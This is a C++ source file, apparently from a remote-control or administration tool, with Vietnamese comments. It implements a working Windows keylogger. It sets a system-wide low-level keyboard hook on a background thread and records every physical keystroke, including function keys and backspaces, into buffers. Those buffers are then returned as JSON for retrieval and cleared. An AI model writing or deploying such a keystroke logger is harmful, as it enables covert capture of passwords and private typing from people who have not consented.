// controllers/KeylogController.cpp (FINAL STABLE VERSION)
#include "KeylogController.h"
#include "../utils/helpers.h"
#include <windows.h>
#include <mutex>
#include <atomic>
#include <thread>
#include <string>

using namespace std;

// --- STATE ---
static string bufferRaw = "";     // Khung dưới: Đầy đủ (Raw + Phím chức năng)
static string bufferDisplay = ""; // Khung trên: Chỉ văn bản (Giống code cũ)
static mutex logMutex;
static atomic<bool> keylogEnabled(false);
static HHOOK hKeyboardHook = NULL;

// --- HELPER 1: CHỈ LẤY KÝ TỰ VĂN BẢN (Cho khung trên) ---
// Logic này mô phỏng lại code GetAsyncKeyState ban đầu: Chỉ lấy ký tự đọc được
string getSimpleChar(DWORD vkCode, bool shift, bool caps)
{
    // A-Z
    if (vkCode >= 'A' && vkCode <= 'Z')
    {
        char c = (char)vkCode;
        if (!(shift ^ caps))
            c += 32; // Chuyển thường
        return string(1, c);
    }
    // 0-9 và các ký tự trên phím số
    if (vkCode >= '0' && vkCode <= '9')
    {
        if (!shift)
            return string(1, (char)vkCode);
        string syms = ")!@#$%^&*(";
        if (vkCode - '0' < syms.length())
            return string(1, syms[vkCode - '0']);
    }
    // Numpad (Phím số bên phải)
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9)
        return string(1, (char)('0' + (vkCode - VK_NUMPAD0)));

    // Các phím văn bản cơ bản
    if (vkCode == VK_SPACE)
        return " ";
    if (vkCode == VK_RETURN)
        return "\n"; // Xuống dòng
    // Lưu ý: Khung trên ta KHÔNG lấy Backspace để văn bản liền mạch (hoặc bạn có thể thêm nếu muốn)
    if (vkCode == VK_TAB)
        return "\t";

    // Dấu câu cơ bản (Hardcode theo chuẩn US)
    switch (vkCode)
    {
    case VK_OEM_PERIOD:
        return shift ? ">" : ".";
    case VK_OEM_COMMA:
        return shift ? "<" : ",";
    case VK_OEM_MINUS:
        return shift ? "_" : "-";
    case VK_OEM_PLUS:
        return shift ? "+" : "=";
    case VK_OEM_1:
        return shift ? ":" : ";";
    case VK_OEM_2:
        return shift ? "?" : "/";
    case VK_OEM_3:
        return shift ? "~" : "`";
    case VK_OEM_4:
        return shift ? "{" : "[";
    case VK_OEM_5:
        return shift ? "|" : "\\";
    case VK_OEM_6:
        return shift ? "}" : "]";
    case VK_OEM_7:
        return shift ? "\"" : "'";
    case VK_MULTIPLY:
        return "*";
    case VK_ADD:
        return "+";
    case VK_SUBTRACT:
        return "-";
    case VK_DECIMAL:
        return ".";
    case VK_DIVIDE:
        return "/";
    }

    return ""; // Các phím chức năng (Ctrl, Alt...) sẽ bị bỏ qua ở khung này
}

// --- HELPER 2: LẤY TOÀN BỘ PHÍM (Cho khung dưới) ---
string getFullRawChar(DWORD vkCode, bool shift, bool caps)
{
    // Thử lấy ký tự văn bản trước (tận dụng hàm trên)
    string simple = getSimpleChar(vkCode, shift, caps);

    // Nếu là Enter ở khung dưới thì hiện rõ thẻ [ENTER] thay vì xuống dòng
    if (vkCode == VK_RETURN)
        return "\n[ENTER]\n";
    if (vkCode == VK_BACK)
        return "[BS]"; // Khung dưới cần hiện nút xóa

    if (!simple.empty() && vkCode != VK_RETURN && vkCode != VK_SPACE && vkCode != VK_TAB)
        return simple;

    if (vkCode == VK_SPACE)
        return " ";
    if (vkCode == VK_TAB)
        return "[TAB]";

    // Map các phím chức năng
    switch (vkCode)
    {
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
        return "[CTRL]";
    case VK_MENU:
    case VK_LMENU:
    case VK_RMENU:
        return "[ALT]";
    case VK_CAPITAL:
        return "[CAPS]";
    case VK_ESCAPE:
        return "[ESC]";
    case VK_PRIOR:
        return "[PGUP]";
    case VK_NEXT:
        return "[PGDN]";
    case VK_END:
        return "[END]";
    case VK_HOME:
        return "[HOME]";
    case VK_LEFT:
        return "[LEFT]";
    case VK_UP:
        return "[UP]";
    case VK_RIGHT:
        return "[RIGHT]";
    case VK_DOWN:
        return "[DOWN]";
    case VK_DELETE:
        return "[DEL]";
    case VK_INSERT:
        return "[INS]";
    case VK_F1:
        return "[F1]";
    case VK_F2:
        return "[F2]";
    case VK_F3:
        return "[F3]";
    case VK_F4:
        return "[F4]";
    case VK_F5:
        return "[F5]";
    case VK_F6:
        return "[F6]";
    case VK_F7:
        return "[F7]";
    case VK_F8:
        return "[F8]";
    case VK_F9:
        return "[F9]";
    case VK_F10:
        return "[F10]";
    case VK_F11:
        return "[F11]";
    case VK_F12:
        return "[F12]";
    }
    return "";
}

// --- HOOK CALLBACK ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        if (keylogEnabled.load())
        {
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
            {
                KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;

                // Bỏ qua phím do phần mềm (Unikey) sinh ra để tránh lặp/rác
                bool isInjected = (p->flags & LLKHF_INJECTED) != 0;

                if (!isInjected)
                {
                    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                    lock_guard<mutex> lock(logMutex);

                    // 1. Khung trên: Chỉ hiện chữ (Logic cũ)
                    bufferDisplay += getSimpleChar(p->vkCode, shift, caps);

                    // 2. Khung dưới: Hiện tất cả (Raw + Chức năng)
                    bufferRaw += getFullRawChar(p->vkCode, shift, caps);
                }
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// --- THREAD LOOP ---
static void KeyLoggerThreadFunc()
{
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (hKeyboardHook)
        UnhookWindowsHookEx(hKeyboardHook);
}

// --- PUBLIC ---
void KeylogController::startKeyLoggerThread()
{
    thread(KeyLoggerThreadFunc).detach();
}

string KeylogController::getKeylog()
{
    lock_guard<mutex> lock(logMutex);

    // Tạo JSON trả về cho cả 2 khung
    string json = "{";
    json += "\"raw\":\"" + jsonEscape(bufferRaw) + "\",";
    json += "\"display\":\"" + jsonEscape(bufferDisplay) + "\","; // Khung trên
    json += "\"enabled\":" + string(keylogEnabled.load() ? "true" : "false");
    json += "}";

    bufferRaw = "";
    bufferDisplay = "";
    return json;
}

void KeylogController::setKeylog(bool enabled)
{
    bool wasEnabled = keylogEnabled.load();
    keylogEnabled.store(enabled);
    if (enabled && !wasEnabled)
    {
        lock_guard<mutex> lock(logMutex);
        bufferRaw = "";
        bufferDisplay = "";
    }
}